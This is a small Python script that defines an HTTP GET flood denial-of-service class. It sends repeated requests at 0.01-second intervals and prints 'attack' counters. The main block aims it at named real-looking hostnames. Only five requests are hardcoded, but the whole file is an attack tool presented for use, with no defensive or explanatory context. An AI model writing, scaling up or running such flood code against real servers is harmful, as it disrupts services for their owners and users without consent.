import http.client
import time

class Dos(object):
    def __init__(self):
        pass

    def httpGetFlood(self,sleepTime,servAddr,url):
        for i in range(5):
            print('第',i+1,'次攻击')
            time.sleep(sleepTime)
            try:
                conn = http.client.HTTPConnection(servAddr)
                conn.request('GET',url)
                r1 = conn.getresponse()
                print(r1.status,r1.reason)
                conn.close()
            except IOError as e:
                print("except:",e)
            finally:
                pass
        print("httpGetDoS END")



if __name__ == '__main__':
    #servAddr = "hackbiji.top"
    servAddr = "www.dthas.info"
    #url = "/"
    url = "/index.html"
    sleepTime = 0.01
    hack = Dos()
    hack.httpGetFlood(sleepTime,servAddr,url)
